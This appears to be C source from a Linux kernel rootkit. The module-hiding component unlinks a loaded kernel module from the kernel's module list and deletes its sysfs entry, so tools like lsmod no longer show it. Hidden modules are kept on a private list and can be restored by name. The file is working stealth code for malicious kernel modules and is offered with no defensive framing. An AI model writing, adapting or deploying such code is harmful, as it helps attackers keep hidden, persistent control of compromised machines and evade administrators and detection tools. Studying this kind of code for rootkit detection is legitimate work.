#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/list.h>
#include <linux/kobject.h>

#include "kernel_functions.h"
#include "kernel_variables.h"
#include "module_hiding.h"

#define STATE_MODULES_VISIBLE 0
#define STATE_MODULES_HIDDEN 1

int modules_state = STATE_MODULES_VISIBLE;

LIST_HEAD(hidden_modules);

struct module* find_hidden_module(char* name)
{
  struct module* mod;

  list_for_each_entry(mod, &hidden_modules, list) {
   if (strcmp(mod->name, name) == 0) {
    return mod;
   }
  }
  return NULL;
}

void hide_module(struct module* mod)
{
  if (modules_state == STATE_MODULES_VISIBLE) {
    return;
  }

  // Remove the module from the linked list
  list_del(&mod->list);

  // Make a backup of the kobject
  // saved_kobj = mod->mkobj.kobj;

  // Remove the sysfs entry completely
  kobject_del(&mod->mkobj.kobj);

  // Avoid double free when rmmod-ing
  mod->sect_attrs = NULL;
  mod->notes_attrs = NULL;

  // Second approach: Only remove the sysfs directory entry
  /*
  struct sysfs_dirent **pos;
  struct sysfs_dirent *sd = mod->mkobj.kobj.sd;

  for (pos = &sd->s_parent->s_dir.children; *pos; pos = &(*pos)->s_sibling) {
    if (*pos == sd) {
      *pos = sd->s_sibling;
      sd->s_sibling = NULL;
      break;
    }
  }
  */

  // Insert module into hidden list
  list_add_tail(&mod->list, &hidden_modules);
}

void unhide_module(struct module* mod)
{
  // Remove module from the hidden list
  list_del(&mod->list);

  // Add the module to the linked list again
  list_add(&mod->list, modules);

  // Restore sysfs entry
  // Commented out to avoid warning after unloading the module
  /*
  mod->mkobj.kobj = saved_kobj;
  kobject_add(&mod->mkobj.kobj, mod->mkobj.kobj.parent, "%s", mod->mkobj.kobj.name);
  */

  /*
  // Restore the sysfs directory entry (second approach)
  struct sysfs_dirent **pos;
  struct sysfs_dirent *sd = mod->mkobj.kobj.sd;

  for (pos = &sd->s_parent->s_dir.children; *pos; pos = &(*pos)->s_sibling);
  *pos = sd;
  */
}

void set_module_hidden(char* name)
{
  struct module* mod;

  mutex_lock(&module_mutex);
  mod = find_module(name);
  mutex_unlock(&module_mutex);

  if (mod != NULL) {
    hide_module(mod);
  }
}

void set_module_visible(char* name)
{
  struct module* mod = find_hidden_module(name);

  if (mod != NULL) {
    unhide_module(mod);
  }
}

void enable_module_hiding(void)
{
  modules_state = STATE_MODULES_HIDDEN;
}

void disable_module_hiding(void)
{
  // Unhide all hidden modules
  while (hidden_modules.next != &hidden_modules) {
    struct module* mod = container_of(hidden_modules.next, struct module, list);
    unhide_module(mod);
  }

  modules_state = STATE_MODULES_VISIBLE;
}

void init_module_hiding(void)
{
  enable_module_hiding();
}

void finalize_module_hiding(void)
{
  disable_module_hiding();
}